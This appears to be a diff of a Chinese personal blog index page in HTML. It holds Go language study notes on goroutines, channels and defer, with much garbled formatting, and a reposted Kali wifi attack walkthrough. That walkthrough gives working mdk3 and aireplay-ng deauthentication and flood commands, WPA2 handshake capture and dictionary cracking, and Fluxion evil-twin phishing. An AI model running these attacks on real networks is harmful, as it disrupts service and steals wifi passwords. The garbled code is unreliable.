-4.   go允许使用go语句开启一个新的运行期线程，即goroutine,以一个不同的，新创建的goroutine来执行一个函数
-
-5.   同一个程序中所有的goroutine共享同一个地址空间
-
-6.   &#96;&#96;&#96;go
-     package main
-     
-     import (
-     	&quot;fmt&quot;
-     	&quot;time&quot;
-     )
-     
-     func say(s string) &#123;
-     	for i :&#x3D; 0;i &lt; 5;i++ &#123;
-     		time.Sleep(100 * time.Millisecond)
-     		fmt.Println(s)
-     	&#125;
-     &#125;
-     
-     func main() &#123;
-     	go say(&quot;world&quot;)
-     	say(&quot;hello&quot;)
-     &#125;
-     &#x2F;&#x2F;这个程序中输出的hello和world没有固定的顺序，因为是两个goroutine在执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h3><ol>
-<li><p>  channel是用来传输数据的一个数据结构</p>
-</li>
-<li><p>  通道可以用于两个goroutine之间通过传递一个指定类型的值来同步运行和通讯</p>
-</li>
-<li><p>  操作符 <strong>&lt;-</strong> 用于指定通道的方向，发送或接收，如果没有指定方向，则为双向通道</p>
-</li>
-<li><p>```<br>  ch &lt;- v //把v发送到通道ch<br>  v := &lt;- ch //从ch接收数据，并把值赋给v</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-### 通道的声明
-
-&#96;&#96;&#96;go
-ch :&#x3D; make(chan int)
-&#x2F;&#x2F;通道的声明使用chan关键字，在声明之前必须先创建<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  默认情况下，<strong>通道是不带缓冲区的</strong>，发送端发送数据，同时<strong>必须有接收端相应的接收数据</strong></p>
-</li>
-<li><p>```go<br>  package main</p>
-<p>  import “fmt”</p>
-<p>  func sum(s []int,c chan int) {</p>
-<pre><code>  sum := 0
-  for _,v := range s &#123;
-      sum += v
-  &#125;
-  c &lt;- sum //将sum发送到通道c
-</code></pre>
-<p>  }</p>
-<p>  func main() {</p>
-<pre><code>  s := []int&#123;7, 2, 8, -9, 4, 0&#125;
+  发现http的数据是延时注入的数据
   
-  c := make(chan int)
-  go sum(s[:len(s)/2],c)
-  go sum(s[len(s)/2:],c)
-  x , y := &lt;-c,&lt;-c
-
-  fmt.Println(x,y,x+y)
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-### 通道缓冲区
-
-1.   &#96;&#96;&#96;go
-     ch :&#x3D; make(chan int,100)
-     &#x2F;&#x2F;通道可以设置缓冲区，通过make的第二个参数指定缓冲区的大小<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区中，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据</p>
-</li>
-<li><p>  不过由于缓冲区的大小是有限的，还是需要有接收端来接收数据，否则缓冲区一满，数据发送端就无法再发送数据了</p>
-</li>
-</ol>
-<h2 id="const和iota"><a href="#const和iota" class="headerlink" title="const和iota"></a>const和iota</h2><ol>
-<li><p>  和定义变量类似，就是<strong>将定义变量时的var关键字替换为const关键字</strong></p>
-</li>
-<li><p>```<br>   package main</p>
-<p>   import “fmt”</p>
-<p>   func main() {</p>
-<pre><code>   const length int = 10
-   fmt.Println(&quot;length = &quot;,length)
-   
-</code></pre>
-<p>   }</p>
-   <pre class="line-numbers language-none"><code class="language-none">
-## 一个函数有多个返回值
-
-&#96;&#96;&#96;go
-package main
-
-import &quot;fmt&quot;
-
-&#x2F;&#x2F;返回多个返回值，匿名的
-func foo(a string,b int) (string , int) &#123;
-	fmt.Println(&quot;a&#x3D;&quot;,a)
-	fmt.Println(&quot;b&#x3D;&quot;,b)
-
-	return a,b
-&#125;
-
-&#x2F;&#x2F;返回多个返回值，有形参名称的
-func foo3(a string,b int) (r1 int,r2 int) &#123;
-	fmt.Println(&quot;-----foo3-----&quot;)
-	fmt.Println(&quot;a&#x3D; &quot;,a)
-	fmt.Println(&quot;b&#x3D; &quot;,b)
-
-	&#x2F;&#x2F;给有名称的返回值变量赋值
-	r1 &#x3D; 1000
-	r2 &#x3D; 2000
-
-	return r1,r2
-&#125;
-
-func foo4(a string,b int) (r1,r2 int) &#123;
-	fmt.Println(&quot;-----foo4------&quot;)
-	fmt.Println(&quot;a&#x3D; &quot;,a)
-	fmt.Println(&quot;b&#x3D; &quot;,b)
-
-	&#x2F;&#x2F;给有名称的返回值变量赋值
-	r1&#x3D;1000
-	r2&#x3D;2000
-	return r1,r2
-&#125;
-
-func main() &#123;
-	ret1 ,ret2 :&#x3D; foo(&quot;abc&quot;,100);
-	fmt.Println(&quot;ret1:&quot;,ret1,&quot;ret2:&quot;,ret2)
-
-	ret3 , ret4 :&#x3D; foo3(&quot;foo3&quot;,333)
-	fmt.Println(&quot;ret3 &#x3D; &quot;,ret3,&quot;ret4 &#x3D; &quot;,ret4)
-
-	ret5,ret6 :&#x3D; foo
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="导包的路径问题和init方法调用"><a href="#导包的路径问题和init方法调用" class="headerlink" title="导包的路径问题和init方法调用"></a>导包的路径问题和init方法调用</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008100203.png"></p>
-<h2 id="import匿名及别名导包方式"><a href="#import匿名及别名导包方式" class="headerlink" title="import匿名及别名导包方式"></a>import匿名及别名导包方式</h2><h3 id="匿名导包"><a href="#匿名导包" class="headerlink" title="匿名导包"></a>匿名导包</h3><ol>
-<li><p>  想<strong>调用这个包的init()函数</strong>，但是<strong>不想使用这个包的接口的需求</strong></p>
-</li>
-<li><p>  这种需求就可以使用匿名导入方式**(这种方法类似于起别名)**</p>
-</li>
-<li><p>  就可以在<strong>导入的包的前面加上下划线，空格</strong></p>
-</li>
-<li><p>```<br>  import _ “GolangStudy/S-init/lib1”</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   **此时无法使用当前包的方法，但是会执行当前包内部的init方法**
-
-### 别名导包
-
-1.   在包的名字前面加上包的别名，即可使用别名，不使用包原来的名字
-
-2.   &#96;&#96;&#96;go
-     mylib2 &quot;GolangStudy&#x2F;S-init&#x2F;lib2&quot;
-     &#x2F;&#x2F;在main函数中可以使用别名进行调用
-     mylib2.Lib2Test();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  在包的名字前面加上点，空格，就可以不使用包的名字，直接使用包内部的函数</p>
-</li>
-<li><p>```go<br>  . “GolangStudy/S-init/lib2”<br>  Lib2Test();</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   这种点的导入方式尽量不要使用，可能会有同名函数起冲突
-
-6.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221008103242.png)
-
-## go语言的析构函数
-
-1.   go语言的析构函数关键字是defer
-
-2.   &#96;&#96;&#96;go
-     defer fmt.Println(&quot;一个函数体中允许有多个析构函数，调用顺序是从上到下&quot;); &#x2F;&#x2F;这样会在函数体的结束调用这个析构函数
-     defer fmt.Println();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  在函数的前面添加defer关键字即为析构函数</p>
-</li>
-</ol>
-<h3 id="defer和return的调用先后问题"><a href="#defer和return的调用先后问题" class="headerlink" title="defer和return的调用先后问题"></a>defer和return的调用先后问题</h3><ol>
-<li>  defer是当前函数的生命周期全部结束之后才会被调用，才会出栈</li>
-<li>  调用顺序是先调用return,在函数的生命周期结束之后才会调用defer</li>
-<li>  书写顺序是先书写defer，然后再书写return,类似于c++</li>
-</ol>
-<h2 id="给一个结构体绑定方法"><a href="#给一个结构体绑定方法" class="headerlink" title="给一个结构体绑定方法"></a>给一个结构体绑定方法</h2><ol>
-<li><p>  给一个结构体绑定方法，一定要用指针</p>
-</li>
-<li><p>```go<br>  func (this *Hero) Show(){}</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221008171748.png)
-
-## go语言方法
-
-![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221015100204.png)
-
-1.   方法是**作用在指定的数据类型上**的，**和指定的数据类型绑定**，因此**自定义类型都可以拥有方法**
-
-2.   &#96;&#96;&#96;go
-     type A struct &#123;
-     	Num int;
-     &#125;
-     func (a A) test()&#123; &#x2F;&#x2F;中间的(a A)表示这个方法是绑定到A结构体上的，类似于成员方法（A这个类的成员方法）
-     	fmt.Println(a.Num);
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  这个方法是和某个对象绑定的，所以通过某个对象来调用</p>
-</li>
-<li><p>```go<br>  package main</p>
-<p>  import (</p>
-<pre><code>  &quot;fmt&quot;
-</code></pre>
-<p>  )</p>
-<p>  type Person struct {</p>
-<pre><code>  Name string
-</code></pre>
-<p>  }</p>
-<p>  func (p Person) test() { //这个方法是绑定到Person类的</p>
-<pre><code>  fmt.Printf(&quot;test() name=%s&quot;,p.Name)
-</code></pre>
-<p>  }</p>
-<p>  func main() {</p>
-<pre><code>  var p Person
-  p.Name = &quot;tom&quot;
-  p.test() //所以要通过Person类的实例进行调用,不能直接test()直接调用，也不能使用其它类型的变量来调用
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   func (p Person) test()&#123;&#125; ...p表示哪个Person变量调用，这个p就是它的副本，这点和函数传参（引用）非常相似
-
-6.   p这个名字，由程序员指定，不是固定
-
-## go语言错误处理
-
-1.   通过内置的错误接口提供了简单的错误处理机制
-
-2.   error类型是一个接口类型
-
-3.   &#96;&#96;&#96;go
-     type error interface &#123;
-     	Error() string
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  可以在编码中通过实现error接口类型来生成错误信息</p>
-</li>
-<li><p>  函数通常在最后的返回值中返回错误信息，使用errors.New可以返回一个错误信息</p>
-</li>
-<li><p>```go<br>  func Sqrt(f float64) (float64,error) {</p>
-<pre><code>  if f &lt; 0 &#123;
-      return 0,errors.New(&quot;math:square root of negative number&quot;)
-  &#125;
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-## go语言创建对象的方式
-
-1.   使用T&#123;...&#125;方式，结果为值类型
-
-2.   使用new的方式，结果为指针类型
-
-3.   使用&amp;方式，结果为指针类型
-
-4.   &#96;&#96;&#96;go
-     c3 :&#x3D; &amp;Car&#123;
-     	color:&quot;红色&quot;
-     	length:&quot;10&quot;
-     &#125;&#x2F;&#x2F;使用&amp;进行对象的创建，使用冒号进行赋值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="go语言高并发"><a href="#go语言高并发" class="headerlink" title="go语言高并发"></a>go语言高并发</h2><h3 id="通道-1"><a href="#通道-1" class="headerlink" title="通道"></a>通道</h3><ol>
-<li><p>  通道channel是用来传递数据的一个数据结构</p>
-</li>
-<li><p>  可以用于两个goroutine之间通过传递一个指定类型的值来实现同步运行和通讯，&lt;-用来指定通道的方向，发送或接受数据，如果没有指定方向，则为双向通道</p>
-</li>
-<li><p>  声明一个通道使用chan关键字，通道在使用前必须先创建</p>
-</li>
-<li><p>```go<br>  ch := make(chan int)</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-## 复习
-
-### channel定义
-
-1.   channel : make(chan 类型，容量)
-
-2.   &#96;&#96;&#96;
-     ch :&#x3D; make(chan string)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  写端：ch &lt;- “hehe” ,写端写数据，读端不再读，写端阻塞</p>
-</li>
-<li><p>  读端：str := &lt;- ch , 读端读数据，同时写端不在写，读端阻塞</p>
-</li>
-<li><p>  通道中的数据只能读取一次，不能多次重复读取，读完就消失</p>
-</li>
-</ol>
-<h3 id="有缓冲通道：同步通信"><a href="#有缓冲通道：同步通信" class="headerlink" title="有缓冲通道：同步通信"></a>有缓冲通道：同步通信</h3><h3 id="无缓冲通道：异步通信"><a href="#无缓冲通道：异步通信" class="headerlink" title="无缓冲通道：异步通信"></a>无缓冲通道：异步通信</h3><pre class="line-numbers language-none"><code class="language-none">ch :&#x3D; make(chan int,5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<ol>
-<li>  len(ch):channel中<strong>剩余未读取数据</strong>的个数</li>
-<li>  cap(ch):<strong>通道的容量</strong></li>
-</ol>
-<h3 id="关闭channel"><a href="#关闭channel" class="headerlink" title="关闭channel"></a>关闭channel</h3><ol>
-<li><p>  写和读是两个不同的goroutine,当确定不再继续向对端发送数据时，关闭channel,使用close(ch)关闭channel</p>
-</li>
-<li><p>  如果写端关闭，读端再去读，就会读到一个0/nil，类似于EOF，此时就需要去关闭channel</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108211902.png"></p>
-</li>
-<li><p>  对端可以判断channel是否关闭</p>
-</li>
-<li><p>```go<br>  if num,ok := &lt;- ch;ok == true{</p>
-<pre><code>  //如果对端已经关闭，ok==false，num无数据
-  //如果对端没有关闭，ok==true，num保存读到的数据
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-6.   可以使用range来替代ok
-
-7.   &#96;&#96;&#96;go
-     for num :&#x3D; range ch &#123;
-     &#x2F;&#x2F;和循环遍历类似，ch不能替换为&lt;-
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108212359.png"></p>
-</li>
-<li><p>  关闭的channel不能再向其中写数据，但是可以从中读取数据</p>
-</li>
-</ol>
-<h3 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型"></a>生产者消费者模型</h3><ol>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108213838.png"></p>
-</li>
-<li><p>```go<br>  package main</p>
-<p>  import “fmt”</p>
-<p>  func producer(out chan &lt;- int,a int) {</p>
-<pre><code>  out &lt;- a
-  fmt.Println(&quot;生产者提供数据&quot;,a)
-  close(out)
-</code></pre>
-<p>  }</p>
-<p>  func consumer(in &lt;- chan int){</p>
-<pre><code>  for data := range in&#123;
-      fmt.Println(&quot;消费者得到数据&quot;,data)
-  &#125;
-</code></pre>
-<p>  }</p>
-<p>  func main() {</p>
-<pre><code>  ch := make(chan int,5)
-
-  go producer(ch,5)
-  consumer(ch)
-</code></pre>
-<p>  }<br>  //双向channel var ch chan int 没有箭头<br>  //单向写channel var sendCh chan &lt;- int  sendCh = make(chan &lt;- int) 可以理解为chan为写入对象或读出对象，写入channel chan &lt;- 读出channel &lt;- chan<br>  //单向读channel var recvCh &lt;- chan int   recvCh = make(&lt;- chan int)<br>  //双向channel可以任意转换为一种单向channel<br>  //单向channel不能转换为双向</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-### 定时器
-
-![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221108214033.png)
-
-1.   &#96;&#96;&#96;go
-     type Timer struct &#123;
-         
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li></li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E5%8F%96%E6%B6%88%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/">
-                取消身份认证攻击
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-14</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E5%8F%96%E6%B6%88%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="取消身份认证攻击"><a href="#取消身份认证攻击" class="headerlink" title="取消身份认证攻击"></a>取消身份认证攻击</h1><ol>
-<li>  经同意转载自队友毕师傅博客</li>
-<li>  <a target="_blank" rel="noopener" href="https://xiyuanhuaigu.gitee.io/2022/09/13/kali-WIFI%E6%94%BB%E5%87%BB/">kali WIFI攻击 | 惜缘怀古的博客 (gitee.io)</a></li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/kali-WIFI%E6%94%BB%E5%87%BB/">
-                kali WIFI攻击
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-13</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/kali-WIFI%E6%94%BB%E5%87%BB/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="无线渗透攻击"><a href="#无线渗透攻击" class="headerlink" title="无线渗透攻击"></a>无线渗透攻击</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>  首先呢我们我们来看一下渗透之前需要准备的工具。</p>
-<ul>
-<li><p>kali linux系统</p>
-</li>
-<li><p>监听网卡</p>
-</li>
-<li><p>aircark-ng套件</p>
-</li>
-<li><p>mdk3工具</p>
-</li>
-<li><p>fluxion工具</p>
-</li>
-</ul>
-<p>上面的这些准备工作需要特点注意的一点是这个监听网卡，注意在某宝购买的过程中一定要注意购买的网卡是否是双频，我在购买的时候没有注意，所以购买的是单频网卡也就是2.4G版本的，没有办法收到5G频段，现在家用主流的路由器基本上都是双频，所以只能攻击单频段的话通常会自动跳转到另一个频段导致无法抓取数据包。关于aircark-ng套件在kali是内置的，mdk3以及fluxion需要下载一下。</p>
-<pre class="line-numbers language-none"><code class="language-none">apt-get install mdk3
-git clone https:&#x2F;&#x2F;github.com&#x2F;FluxionNetwork&#x2F;fluxion.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><p>目前市面上主流路由器的加密方式是WPA2，是WPA的升级版，它们的区别是，WPA2使用更安全的加密技术AES ，因此比WPA更难破解，也更安全。 但是依旧会被攻击，本章节测试环境就是以WPA2加密的路由器进行的。说起无线局域网，不得不提及路由器的两个接口LAN和WAN以及WLAN。</p>
-<p>LAN可以理解为局域网，通过接入LAN口的设备即处于这个局域网内。<br>WAN口可以理解为广域网，是连接外网的接口，是对外的，作用是接入网络。<br>WLAN是无线局域网。<br>LAN和WLAN是对内，像电脑，手机，电视等都是接入在这个接口，他们之间构成了一个局域网可以相互通信。他们对外通信需要先经过路由器然后向外转发。</p>
-<p>这里我们针对无线攻击是针对路由器进行的，通过路由器导致局域网内的设备无法对外通信或者抓取他们的通信数据。</p>
-<h2 id="监听网卡配置"><a href="#监听网卡配置" class="headerlink" title="监听网卡配置"></a>监听网卡配置</h2><p>在虚拟机中装入可以进行监听的网卡，连接网卡之后使用命令查看网卡的配置</p>
-<pre class="line-numbers language-none"><code class="language-none">iwconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913204359616.png"></p>
-<p>我们可以看到虚拟机已经识别网卡，下面我们需要将网卡切换为监听模式。监听模式是指无线网卡可以接收所有经过它的数据流的工作方式。这里我们使用命令开启监听模式:</p>
-<pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这里的wlan0是我们网卡的名字，通过iwconfig可以看到。</p>
-<p>执行完上述命令后，再执行iwconfig我们发现网卡名称变为了wlan0这说明网卡进入了监听模式，下面我们就可以进行测试了。</p>
-<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913204726968.png"></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先我们需要对附近的网络进行扫描，获取附近wifi的一些信息。这对后面的渗透非常重要，我们需要这一步获取到的信息来进行后面的渗透操作。<br>输入命令来获取无线wifi列表</p>
-<pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>BSSID：wifi的mac地址。<br>PWR：网卡报告的信号水平，数值越低信号越好，忽略前面的负号。<br>Beacons：无线发出的通告编号<br>CH：信道<br>MB：无线所支持的最大速率<br>ENC：使用的加密算法体系，OPN表示无加密<br>CIPHER：检测到的加密算法<br>AUTH：使用的认证协议。<br>ESSID：wifi名称<br>STATION：客户端的MAC地址，包括连上的和想要搜索无线来连接的客户端。如果客户端没有连接上，就在BSSID下显示“notassociated”。<br>Rate：表示传输率。<br>Lost：在过去10秒钟内丢失的数据分组<br>Frames：客户端发送的数据分组数量。<br>Probe：被连接的wifi名</p>
-<h2 id="mdk3利用攻击"><a href="#mdk3利用攻击" class="headerlink" title="mdk3利用攻击"></a>mdk3利用攻击</h2><p><strong>MDK3 是一款无线DOS 攻击测试工具，能够发起Beacon Flood、Authentication  DoS、Deauthentication/Disassociation Amok 等模式的攻击,另外它还具有针对隐藏ESSID  的暴力探测模式、802.1X 渗透测试等功能。</strong></p>
-<p>安装方法文章上面已经讲过，这里就不再进行陈述。我们主要来看一下验证洪水攻击和取消身份验证攻击这也是使用比较多的两种攻击方式。</p>
-<h3 id="验证洪水攻击-Authentication-Flood-Attack"><a href="#验证洪水攻击-Authentication-Flood-Attack" class="headerlink" title="验证洪水攻击/Authentication Flood Attack"></a>验证洪水攻击/Authentication Flood Attack</h3><p>验证洪水攻击，通常被简称为Auth攻击，是无线网络拒绝服务攻击的一种形式。该攻击目标主要针对那些处于通过验证、和AP建立关联的关联客户端，攻击者将向AP发送大量伪造的身份验证请求帧(伪造的身份验证服务和状态代码)，当收到大量伪造的身份验证请求超过所能承受的能力时，AP将断开其它无线服务连接。</p>
-<p> <strong>a是指验证洪水攻击，-a为指定攻击wifi的mac。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">mdk3 wlan0 a -a 50:2B:73:6A:18:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>使用上述命令后会发送大量验证信息给目标AP，不久便会断开其他无线连接，继续攻击路由器会卡死崩溃。部分路由器具有防DDOS功能可以防止此类攻击。这样的攻击模式下，路由器会变得特别慢。</p>
-<h3 id="取消身份验证攻击-De-authentication-Flood-Attack"><a href="#取消身份验证攻击-De-authentication-Flood-Attack" class="headerlink" title="取消身份验证攻击/De-authentication Flood Attack"></a>取消身份验证攻击/De-authentication Flood Attack</h3><p>取消验证洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式，它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联的/未认证的状态。对于目前广泛使用的无线客户端适配器工具来说，这种形式的攻击在打断客户端无线服务方面非常有效和快捷。一般来说，在攻击者发送另一个取消身份验证帧之前，客户站会重新关联和认证以再次获取服务。攻击者反复欺骗取消身份验证帧才能使所有客户端持续拒绝服务。<br>d为取消身份验证攻击，-c为指定信道。<br>在攻击的过程中没有任何回显，使用-c指定信道会攻击信道2的所有WIFI，可以使用-w指定白名单，则不会攻击白名单内的信号。</p>
-<p><img src="https://img-blog.csdnimg.cn/2020032814445329.png" alt="在这里插入图片描述"></p>
-<p>我们发现WIFI连接被断开了，再次尝试连接会显示密码错误。</p>
-<h3 id="aireplay-ng-取消身份验证攻击"><a href="#aireplay-ng-取消身份验证攻击" class="headerlink" title="aireplay-ng/取消身份验证攻击"></a>aireplay-ng/取消身份验证攻击</h3><p>aireplay-ng同样是aircark-ng套件中的工具，这里讲解的是他的取消身份验证攻击的分析讲解，下面我们来看一下。<br> <strong>-0为指定攻击方式为取消身份验证攻击，0为无限发送断开包，指定其他数字则为发送离线包的数量，-a指定目标路由器mac地址。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a mac wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>注：若是5GHZ请在mac后添加-D参数，若出现错误可以尝试更换信道</p>
-<pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0 -c 12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p>开始攻击后会不断向目标发送离线包。</p>
-<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913211918763.png"></p>
-<p>攻击过程中，wifi会断开连接，如果尝试重新连接则会要求重新输入wifi密码，所以我也认为它的攻击效果是要优于mdk3的。</p>
-<h2 id="WIFI密码抓取"><a href="#WIFI密码抓取" class="headerlink" title="WIFI密码抓取"></a>WIFI密码抓取</h2><p>这里我们讲解的是wifi密码抓取，基本原理就是我们监听指定路由的数据包，期间使用Deauth攻击，致使wifi下的人重新连接，从而抓取登录时的握手包进行破解</p>
-<p>监听数据包<br>     首先我们需要监听指定频道的数据包，使用命令:<br>-c指定频道，-w指定输出地址，数据包以hello开头，–bssid指定AP的MAC地址。</p>
-<pre><code>airodump-ng -c 2 -w /root/cap/hello --bssid 50:2B:73:6A:18:81 wlan0
-</code></pre>
-<p>我们可以看到箭头所指方向不断的在接收数据包</p>
-<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ycachgr4.bmp"></p>
-<p>现在正在监听该频道，接着我们对其进行取消身份验证攻击，然后手机端重新连接。</p>
-<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ufyngztw.bmp"></p>
-<p>看到箭头所指的方向出现了WPA handshake说明已经成功抓取到，我们ctrl+c停止抓包。可以看到目录中数据包。</p>
-<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/sugzux4t.bmp"></p>
-<p>接着我们对数据包进行爆破，使用命令:<br>-w指定字典</p>
-<pre><code>aircark -w /root/number.txt /root/cap/hello-01.cap
-</code></pre>
-<p>得到wifi密码，攻击利用完毕(没错wifi密码是我的号码)，字典大家可以在网上下载，理论上只要字典厉害都可以爆破出来，有一道CTF题目就是考的这个工具。</p>
-<h2 id="Fluxion渗透工具"><a href="#Fluxion渗透工具" class="headerlink" title="Fluxion渗透工具"></a>Fluxion渗透工具</h2><p>   fluxion是一款无线安全测试工具，其攻击的原理更偏向于社会工程学中的钓鱼。其中的install.sh脚本可以迅速帮你检查所需要的插件并进行安装，可以在短时间内搭建出一个完整的环境。新版增加了对中文的支持，使其更加人性化。整合了包括上面讲解的几种工具组合而成，使攻击更加灵活方便。某种程度上减低了攻击利用的门槛。</p>
-<p>个人认为他的攻击模式偏向社会工程学，与上面的抓取握手包爆破不同，当然也可以选择暴力破解的模式，这里的攻击方式我是选择的伪装AP，工具会攻击断开真的wifi，生成一个相同名字的无密码AP信号，用户连接后会自动弹出页面要求输入wifi密码，当用户输入后则自动把回显信息返回给攻击机。当然得到的密码一定是正确的，因为他会去进行验证，确认为真实密码才会返回。这里准备另起一篇博客细讲。</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
-                Untitled
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-07</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol>
-<li>  打开是一个流量包</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907114300.png"></li>
-<li>  添加http的过滤器</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907114321.png"></li>
-<li>  发现http的数据是延时注入的数据</li>
